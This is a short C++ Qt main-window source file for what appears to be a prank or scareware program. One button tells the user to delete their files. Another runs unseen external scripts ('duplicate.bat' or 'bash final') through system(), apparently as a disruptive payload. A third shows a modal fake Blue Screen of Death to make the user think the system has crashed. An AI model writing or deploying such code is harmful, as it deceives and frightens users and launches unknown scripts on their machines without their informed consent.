#include "mainwindow.h"
#include "./ui_mainwindow.h"
#include "fakebluescreen.h"
#include <QtCore>
#include <QtGui>
#include <QMessageBox>

MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
{
    ui->setupUi(this);
    setWindowFlags(Qt::Dialog | Qt::MSWindowsFixedSizeDialogHint);
}

MainWindow::~MainWindow()
{
    delete ui;
}


void MainWindow::on_yesButton_clicked()
{
    QMessageBox::information(this, "Thank you !", "Please delete you files  now.");
}


void MainWindow::on_noButton_clicked()
{
   #ifdef __WIN32__
    system("duplicate.bat");
   #else
    system("bash final");
   #endif
}


void MainWindow::on_cancelButton_clicked()
{
    fakeBlueScreen fakeBSOD;
    fakeBSOD.setModal(true);
    fakeBSOD.exec();
}

